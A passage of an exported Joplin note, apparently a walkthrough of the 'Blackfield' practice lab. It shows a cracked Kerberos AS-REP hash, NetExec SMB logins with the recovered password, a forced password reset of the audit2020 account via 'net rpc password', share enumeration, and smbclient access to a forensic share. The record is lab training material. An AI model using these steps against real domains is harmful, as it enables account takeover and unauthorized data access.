+Hash.Mode<span class="hljs-params">...</span><span class="hljs-params">...</span>..: <span class="hljs-number">18200</span> (Kerberos <span class="hljs-number">5</span>, etype <span class="hljs-number">23</span>, AS<span class="hljs-params">-REP</span>)
+Hash.Target<span class="hljs-params">...</span><span class="hljs-params">...</span>: $krb5asrep$<span class="hljs-number">23</span>$support@BLACKFIELD.<span class="hljs-built_in">LOCAL</span>:bdd58fae4356<span class="hljs-params">...</span><span class="hljs-number">259</span>f51</code></pre></div>
+<p>---&gt; Authentication is successful</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u support -p &apos;#00^BlackKnight&apos;
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.<span class="hljs-keyword">local</span> -u support -p <span class="hljs-string">&apos;#00^BlackKnight&apos;</span>
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.229</span><span class="hljs-number">.17</span>   <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (domain:BLACKFIELD.<span class="hljs-keyword">local</span>) (signing:<span class="hljs-literal">True</span>) (SMBv1:None) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.229</span><span class="hljs-number">.17</span>   <span class="hljs-number">445</span>    DC01             [+] BLACKFIELD.<span class="hljs-keyword">local</span>\support:<span class="hljs-meta">#00^BlackKnight</span></code></pre></div>
+<p>----&gt; The user support can change the password of audit2020 user</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ net rpc password &quot;audit2020&quot; &quot;new@ssword2022&quot; -U &quot;blackfield.local&quot;/&quot;support&quot;%&quot;#00^BlackKnight&quot; -S &quot;10.129.229.17&quot;   
+                                                                                                                                                                                                                                                            
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u audit2020 -p &apos;new@ssword2022&apos;                                          
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:new@ssword2022</pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Blackfield]
+&boxur;&boxh;$ net rpc password <span class="hljs-string">&quot;audit2020&quot;</span> <span class="hljs-string">&quot;new@ssword2022&quot;</span> -U <span class="hljs-string">&quot;blackfield.local&quot;</span>/<span class="hljs-string">&quot;support&quot;</span>%<span class="hljs-string">&quot;#00^BlackKnight&quot;</span> -S <span class="hljs-string">&quot;10.129.229.17&quot;</span>   
+                                                                                                                                                                                                                                                            
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~<span class="hljs-regexp">/Desktop/</span>Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u audit2020 -p <span class="hljs-string">&apos;new@ssword2022&apos;</span>                                          
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.229</span><span class="hljs-number">.17</span>   <span class="hljs-number">445</span>    DC01             [*] Windows <span class="hljs-number">10</span> / Server <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> x64 (name:DC01) (<span class="hljs-built_in">domain</span>:BLACKFIELD.local) (signing:<span class="hljs-literal">True</span>) (SMBv1:<span class="hljs-built_in">None</span>) (<span class="hljs-literal">Null</span> Auth:<span class="hljs-literal">True</span>)
+SMB         <span class="hljs-number">10.129</span><span class="hljs-number">.229</span><span class="hljs-number">.17</span>   <span class="hljs-number">445</span>    DC01             [+] BLACKFIELD.local\audit2020:<span class="hljs-keyword">new</span>@ssword2022</code></pre></div>
+<p>-----&gt; audit2020 can access another share called forensic</p>
+<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```
+" data-joplin-source-close="
+```">&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u audit2020 -p &apos;new@ssword2022&apos; --shares
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:new@ssword2022 
+SMB         10.129.229.17   445    DC01             [*] Enumerated shares
+SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
+SMB         10.129.229.17   445    DC01             -----           -----------     ------
+SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.229.17   445    DC01             C$                              Default share
+SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
+SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.229.17   445    DC01             profiles$       READ            
+SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
+
+
+----&gt; Can access interesting files
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ smbclient //blackfield.local/forensic -U blackfield.local/audit2020
+Password for [BLACKFIELD.LOCAL\audit2020]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+        5102079 blocks of size 4096. 1694324 blocks available
+smb: \&gt; </pre><pre class="hljs"><code>&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ nxc smb blackfield.local -u audit2020 -p &apos;new@ssword2022&apos; --shares
+SMB         10.129.229.17   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.229.17   445    DC01             [+] BLACKFIELD.local\audit2020:new@ssword2022 
+SMB         10.129.229.17   445    DC01             [*] Enumerated shares
+SMB         10.129.229.17   445    DC01             Share           Permissions     Remark
+SMB         10.129.229.17   445    DC01             -----           -----------     ------
+SMB         10.129.229.17   445    DC01             ADMIN$                          Remote Admin
+SMB         10.129.229.17   445    DC01             C$                              Default share
+SMB         10.129.229.17   445    DC01             forensic        READ            Forensic / Audit share.
+SMB         10.129.229.17   445    DC01             IPC$            READ            Remote IPC
+SMB         10.129.229.17   445    DC01             NETLOGON        READ            Logon server share 
+SMB         10.129.229.17   445    DC01             profiles$       READ            
+SMB         10.129.229.17   445    DC01             SYSVOL          READ            Logon server share
+
+
+----&gt; Can access interesting files
+&boxdr;&boxh;&boxh;(kali㉿kali)-[~/Desktop/Labs/Blackfield]
+&boxur;&boxh;$ smbclient //blackfield.local/forensic -U blackfield.local/audit2020
+Password for [BLACKFIELD.LOCAL\audit2020]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Sun Feb 23 08:03:16 2020
+  ..                                  D        0  Sun Feb 23 08:03:16 2020
+  commands_output                     D        0  Sun Feb 23 13:14:37 2020
+  memory_analysis                     D        0  Thu May 28 16:28:33 2020
+  tools                               D        0  Sun Feb 23 08:39:08 2020
+
+        5102079 blocks of size 4096. 1694324 blocks available
+smb: \&gt; </code></pre></div>
+<p><img src="data:image/png;base64,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